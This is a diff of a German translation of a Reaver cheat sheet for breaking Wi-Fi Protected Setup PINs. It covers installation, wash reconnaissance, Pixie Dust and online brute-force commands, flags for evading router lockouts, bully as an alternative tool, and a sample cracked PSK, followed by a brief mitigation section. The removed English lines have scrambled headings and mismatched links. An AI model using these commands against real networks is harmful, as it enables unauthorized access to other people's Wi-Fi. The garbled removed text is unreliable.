@@ -1,39 +1,42 @@
-# 🔍 Reaver – vollständiger Spickzettel
-
 <!-- language-home-navigation -->
 [🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)
 
-
-[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) is a specialized Wi-Fi security auditing tool designed to execute brute-force attacks against Wi-Fi Protected Setup (WPS) registrar PINs. By recovering the 8-digit WPS PIN, Reaver retrieves the plain-text WPA/WPA2 pre-shared key (PSK). It also supports offline Pixie Dust attacks via `pixiewps`.
-
----
-
-## 📋 Inhaltsverzeichnis
-
-- [[Full Online WPS PIN Brute-Force](#full-online-wps-pin-brute-force)](#wps-vulnerability-mechanics)
-- [Installation](#installation-reaver--pixiewps)
-- [Installation](#reconnaissance-identifying-wps-networks-wash)
-- [`WPS Locked`**: If `Yes`, the router has locked WPS PIN attempts due to previous brute-force activity. Target routers showing `No`.](#pixie-dust-attack-instant-key-recovery)
-- [`-vv`: Verbose output.](#full-online-wps-pin-brute-force)
-- [AP Rate Limiting & Lockout Handling](#ap-rate-limiting--lockout-handling)
-- [Alternative: Using `bully`](#defensive-mitigation)
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## [Full Online WPS PIN Brute-Force](#full-online-wps-pin-brute-force)
 
-[Defensive Mitigation](#defensive-mitigation)
-- The first half is 4 digits ($10^4 = 10,000$ possibilities).
-- The second half is 3 digits + 1 checksum digit ($10^3 = 1,000$ possibilities).
-- Instead of testing $10^8 = 100,000,000$ combinations, an attacker only tests at most $10,000 + 1,000 = 11,000$ attempts.
-- **Pixie Dust Attack**: Exploits weak PRNG (Pseudo-Random Number Generators) in specific wireless chipsets (Ralink, MediaTek, Realtek, Broadcom) to compute the WPS PIN offline in seconds from just 2 initial packets.
+# Reaver-Spickzettel
+
+[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) ist ein spezielles Wi-Fi-Sicherheitsüberwachungstool, das entwickelt wurde, um Brute-Force-Angriffe gegen Wi-Fi Protected Setup (WPS)-Registrar-PINs auszuführen. Durch die Wiederherstellung der 8-stelligen WPS-PIN ruft Reaver den Klartext-WPA/WPA2-Pre-Shared-Key (PSK) ab. Es unterstützt auch Offline-Pixie Dust-Angriffe über `pixiewps`.
 
 ---
 
-## Installation
+## Inhaltsverzeichnis
 
+- [WPS-Sicherheitslückenmechanik](#wps-vulnerability-mechanics)
+- [Installation (`reaver` & `pixiewps`)](#installation-reaver--pixiewps)
+- [Reconnaissance: Identifizieren von WPS-Netzwerken (`wash`)](#reconnaissance-identifying-wps-networks-wash)
+- [Pixie Dust Attack (Instant Key Recovery)](#pixie-dust-attack-instant-key-recovery)
+- [Vollständige Online-WPS-PIN Brute-Force](#full-online-wps-pin-brute-force)
+- [AP-Ratenbegrenzung und Lockout-Handling](#ap-rate-limiting--lockout-handling)
+- [Defensive Mitigation](#defensive-mitigation)
+
+---
+
+## WPS-Sicherheitslückenmechanismen
+
+Die WPS-PIN-Authentifizierung verwendet eine 8-stellige PIN, die in zwei Hälften geteilt ist:
+- Die erste Hälfte besteht aus 4 Ziffern ($10^4 = 10.000$ Möglichkeiten).
+- Die zweite Hälfte besteht aus 3 Ziffern + 1 Prüfsummenziffer ($10^3 = 1.000$ Möglichkeiten).
+- Anstatt 10^8 = 100.000.000 $-Kombinationen zu testen, testet ein Angreifer höchstens 10.000 $ + 1.000 = 11.000 $-Versuche.
+- **Pixie Dust Attack:** Nutzt schwache PRNG (Pseudozufallszahlengeneratoren) in bestimmten drahtlosen Chipsätzen (Ralink, MediaTek, Realtek, Broadcom), um die WPS-PIN offline in Sekunden aus nur 2 Anfangspaketen zu berechnen.
+
+---
+
+## Installation (`reaver` & `pixiewps`)
 ```bash
 # Debian / Ubuntu / Kali Linux
 sudo apt-get update && sudo apt-get install -y reaver pixiewps bully
@@ -44,13 +47,11 @@ sudo pacman -S reaver pixiewps
 # Verify command
 reaver -h
 ```
-
 ---
 
-## Installation
+## Aufklärung: Identifizieren von WPS-Netzwerken (`wash`)
 
-Before launching Reaver, find access points with WPS enabled and check if they are locked:
-
+Suchen Sie vor dem Starten von Reaver nach Zugangspunkten mit aktiviertem WPS und prüfen Sie, ob sie gesperrt sind:
 ```bash
 # Put wireless interface into monitor mode
 sudo airmon-ng start wlan0
@@ -60,52 +61,47 @@ sudo iw dev wlan0 set type monitor
 # Scan for WPS-enabled routers using wash
 sudo wash -i wlan0mon
 ```
-Key columns to observe:
-- **`WPS Locked`**: If `Yes`, the router has locked WPS PIN attempts due to previous brute-force activity. Target routers showing `No`.
-- **`WPS Ver`**: WPS version (1.0 or 2.0).
-- **`ESSID` & `BSSID`**: Target network name and MAC.
+Zu beachtende Schlüsselspalten:
+- **`WPS Locked`**: Bei `Yes` hat der Router WPS-PIN-Versuche aufgrund früherer Brute-Force-Aktivitäten gesperrt. Zielrouter mit `No`.
+- **`WPS Ver`**: WPS-Version (1.0 oder 2.0).
+- **`ESSID` & `BSSID`**: Zielnetzwerkname und MAC.
 
 ---
 
-## `WPS Locked`**: If `Yes`, the router has locked WPS PIN attempts due to previous brute-force activity. Target routers showing `No`.
+## Pixie Dust Attack (Sofortige Schlüsselwiederherstellung)
 
-The Pixie Dust attack (`-K 1`) is the fastest attack against WPS. It collects the E-Hash1, E-Hash2, and nonces from the router and cracks the PIN offline without triggering rate limits:
-
+Der Pixie Dust-Angriff (`-K 1`) ist der schnellste Angriff gegen WPS. Es sammelt E-Hash1, E-Hash2 und Nonces vom Router und knackt die PIN offline, ohne Ratenbegrenzungen auszulösen:
 ```bash
 sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
 ```
-- `-i wlan0mon`: Monitor mode interface.
-- Pixie Dust Attack (Instant Key Recovery)
-- `-c 6`: Channel of the target AP.
-- `-K 1`: Run automatic Pixie Dust attack via `pixiewps`.
-- `-vv`: Verbose output.
+- `-i wlan0mon`: Schnittstelle für den Überwachungsmodus.
+- `-b <bssid>`: Ziel-Router-MAC.
+- `-c 6`: Kanal des Ziel-AP.
+- `-K 1`: Automatischen Pixie Dust-Angriff über `pixiewps` ausführen.
+- `-vv`: Ausführliche Ausgabe.
 
-*If vulnerable, the PIN and WPA PSK are printed in under 10 seconds.*
+*Bei Anfälligkeit werden PIN und WPA-PSK in weniger als 10 Sekunden gedruckt.*
 
 ---
 
-## `-vv`: Verbose output.
+## Vollständige Online-WPS-PIN Brute-Force
 
-If vulnerable, the PIN and WPA PSK are printed in under 10 seconds.
-
+Wenn Pixie Dust fehlschlägt, greifen Sie auf Online-Brute-Forcing zurück:
 ```bash
 sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
 ```
-
-Full Online WPS PIN Brute-Force
+Sobald die PIN ermittelt wurde, gibt Reaver Folgendes aus:
 ```text
 [+] Pin cracked in 4520 seconds
 [+] WPS PIN: '12345670'
 [+] WPA PSK: 'SuperSecretWiFiPassword'
 [+] AP SSID: 'Target_Network'
 ```
-
 ---
 
-## AP Rate Limiting & Lockout Handling
+## AP-Ratenbegrenzung und Sperrbehandlung
 
-Many modern routers lock WPS attempts for 5-15 minutes after 3-5 failed tries. Use delay and retry tuning flags:
-
+Viele moderne Router sperren WPS-Versuche für 5–15 Minuten nach 3–5 fehlgeschlagenen Versuchen. Verwenden Sie Verzögerungs- und Wiederholungsoptimierungsflags:
 ```bash
 # Delay 10 seconds between attempts
 sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv
@@ -116,17 +112,15 @@ sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv
 # Ignore NACK packets and keep trying
 sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
 ```
-
-### AP Rate Limiting & Lockout Handling
-`bully` is a fast C implementation of the WPS attack that handles odd router implementations well:
+### Alternative: Verwendung von `bully`
+`bully` ist eine schnelle C-Implementierung des WPS-Angriffs, die mit ungewöhnlichen Router-Implementierungen gut zurechtkommt:
 ```bash
 sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
 ```
-
 ---
 
-## Alternative: Using `bully`
+## Defensive Mitigation
 
-- **Disable WPS Entirely**: The most secure recommendation is to turn off WPS in the router web interface.
-- **Update Firmware**: Modern routers implement strict rate-limiting, exponential backoff, and fix PRNG entropy flaws exploited by Pixie Dust.
-- **Use WPA3**: WPA3 removes legacy PIN-based WPS entirely, replacing it with secure Wi-Fi Easy Connect (DPP).
+- **WPS vollständig deaktivieren:** Die sicherste Empfehlung ist, WPS in der Weboberfläche des Routers auszuschalten.
+- **Firmware aktualisieren:** Moderne Router implementieren eine strikte Ratenbegrenzung, einen exponentiellen Backoff und beheben PRNG-Entropiefehler, die von Pixie Dust ausgenutzt werden.
+- **WPA3 verwenden:** WPA3 entfernt das alte PIN-basierte WPS vollständig und ersetzt es durch sicheres Wi-Fi Easy Connect (DPP).
